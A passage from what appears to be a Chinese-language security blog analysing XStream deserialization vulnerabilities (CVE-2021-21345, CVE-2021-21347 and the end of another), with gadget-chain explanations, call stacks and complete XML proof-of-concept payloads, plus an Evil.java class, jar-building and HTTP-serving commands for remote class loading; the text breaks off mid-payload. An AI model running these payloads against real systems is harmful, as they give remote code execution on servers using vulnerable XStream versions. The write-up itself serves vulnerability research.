class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SerializableConverter 触发 PriorityQueue 的反序列化，一直到 PriorityQueue#siftDownUsingComparator 都和 CC4 一样，只不过本链后面走的是 DataTransferer$IndexedComparator#compare，CC4 走的是 TransformingComparator#compare。</p><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">connect:615, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:4004, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:18, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h3><h4 id="影响范围-6"><a href="#影响范围-6" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><h4 id="版本说明-6"><a href="#版本说明-6" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和CVE-2021-21344一样</li></ul><h4 id="漏洞分析-6"><a href="#漏洞分析-6" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：source 还是<code>PriorityQueue#readObject</code>，只不过 sink 不用   <code>JdbcRowSetImpl#connect</code> 打 JNDI，改用<code>ServerTableEntry#verify</code>  打命令执行。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/bfaee77a5c813ed23e9a0d49f010b133.png"></p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">verify:170, ServerTableEntry (com.sun.corba.se.impl.activation)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">get:343, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:402, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:662, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:256, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:89, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:130, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:161, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:109, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:99, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:125, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:366, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:465, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:103, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:111, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:2492, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:2970, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:721, PriorityQueue (java.util)</span><br><span class="line">siftDown:687, PriorityQueue (java.util)</span><br><span class="line">heapify:736, PriorityQueue (java.util)</span><br><span class="line">readObject:795, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:19, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><h3 id="CVE-2021-21347"><a href="#CVE-2021-21347" class="headerlink" title="CVE-2021-21347"></a>CVE-2021-21347</h3><h4 id="影响范围-7"><a href="#影响范围-7" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>特别注意：JDK &gt;&#x3D;  8u231 可用，其余低版本都会遇到下面这个报错，即便修复了 <code>&lt;outer-class&gt;</code> 报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Caused by: com.sun.tools.javac.processing.AnnotationProcessingError: java.lang.NullPointerException</span><br></pre></td></tr></table></figure><h4 id="版本说明-7"><a href="#版本说明-7" class="headerlink" title="版本说明"></a>版本说明</h4><ul><li>1.3.x 会直接报错</li><li>1.4.15 以后添加了黑名单，和上面是同一个黑名单。</li></ul><h4 id="漏洞分析-7"><a href="#漏洞分析-7" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：XStream 在 xml 对象转 java 对象会触发标签里类的readObject， 于是 source 设置为<code>java.util.PriorityQueue#readObject</code>没有变，sink 是 <code>JavacProcessingEnvironment$NameProcessIterator#hasNext</code>，可以触发 <code>URLClassLoader.loadClass.newInstance</code>动态类加载。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/79fb70a15781c2adf2dffdab3c5cb677.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">hasNext:408, JavacProcessingEnvironment$NameProcessIterator (com.sun.tools.javac.processing)</span><br><span class="line">hasMoreElements:148, MultiUIDefaults$MultiUIDefaultsEnumerator (javax.swing)</span><br><span class="line">nextStream:109, SequenceInputStream (java.io)</span><br><span class="line">read:211, SequenceInputStream (java.io)</span><br><span class="line">readFrom:65, ByteArrayOutputStreamEx (com.sun.xml.internal.bind.v2.util)</span><br><span class="line">get:182, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">toString:286, Base64Data (com.sun.xml.internal.bind.v2.runtime.unmarshaller)</span><br><span class="line">compare:153, ObservableList$1 (javafx.collections)</span><br><span class="line">siftDownUsingComparator:722, PriorityQueue (java.util)</span><br><span class="line">siftDown:688, PriorityQueue (java.util)</span><br><span class="line">heapify:737, PriorityQueue (java.util)</span><br><span class="line">readObject:797, PriorityQueue (java.util)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">callReadObject:132, SerializationMembers (com.thoughtworks.xstream.core.util)</span><br><span class="line">doUnmarshal:443, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:277, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:72, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1404, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1383, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1277, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Vul (POC.priorityQueue)</span><br></pre></td></tr></table></figure><p>这个利用过程的坑比较多，这里写详细一些。</p><p>首先如果出现下面这个错误，说明你需要把 <code>jdk1.8.0_231/lib/tools.jar</code> 添加到依赖里，因为少了对应的类<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/a4effdeacc78be1958af688e2390218e.png"><br>其次是构造一个 <code>Evil.jar</code> ，首先是 <code>Evil.java</code></p><figure class="highlight java"><figcaption><span>title:"Evil.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后使用下面的命令打包，并起好服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac .\Evil.java</span><br><span class="line">jar cvf Evil.jar Evil.class</span><br><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>然后使用下面的 <code>poc.xml</code> 就没问题了</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 